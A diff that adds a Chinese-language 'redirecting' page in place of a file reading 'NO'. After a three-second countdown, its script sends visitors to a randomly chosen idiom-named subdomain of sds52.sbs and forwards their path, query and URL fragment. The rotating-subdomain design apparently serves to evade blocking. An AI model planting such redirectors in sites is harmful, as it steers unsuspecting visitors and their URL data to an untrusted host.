@@ -1,1 +1,78 @@
-NO
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>正在跳转...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: linear-gradient(135deg, #89f7fe, #66a6ff);
+      font-family: "Microsoft YaHei", sans-serif;
+      color: #fff;
+      text-align: center;
+    }
+    .container {
+      animation: fadeIn 1s ease-in-out;
+    }
+    h1 {
+      font-size: 2.5em;
+      margin: 0.2em 0;
+    }
+    p {
+      font-size: 1.2em;
+      margin: 0.5em 0;
+    }
+    .countdown {
+      font-size: 2em;
+      font-weight: bold;
+      margin-top: 1em;
+    }
+    @keyframes fadeIn {
+      from {opacity: 0; transform: scale(0.9);}
+      to {opacity: 1; transform: scale(1);}
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>欢迎访问</h1>
+    <p>页面将在 <span class="countdown">3</span> 秒后自动跳转</p>
+    <p>请稍候...</p>
+  </div>
+
+  <script>
+    // 成语列表
+    var chengyuList = [
+      "一举两得","画龙点睛","事半功倍","万事如意","风和日丽",
+      "百发百中","胸有成竹","鹤立鸡群","锦上添花","顺水推舟",
+      "水到渠成","日新月异","自强不息","厚积薄发","一帆风顺"
+    ];
+
+    // 固定主域名
+    var baseDomain = "sds52.sbs";
+
+    // 随机选一个成语
+    var prefix = chengyuList[Math.floor(Math.random() * chengyuList.length)];
+
+    // 拼接目标地址
+    var targetUrl = location.protocol + "//" + prefix + "." + baseDomain + location.pathname + location.search + location.hash;
+
+    // 倒计时 3 秒
+    var seconds = 3;
+    var countdownEl = document.querySelector(".countdown");
+    var timer = setInterval(function() {
+      seconds--;
+      countdownEl.textContent = seconds;
+      if (seconds <= 0) {
+        clearInterval(timer);
+        location.href = targetUrl;
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
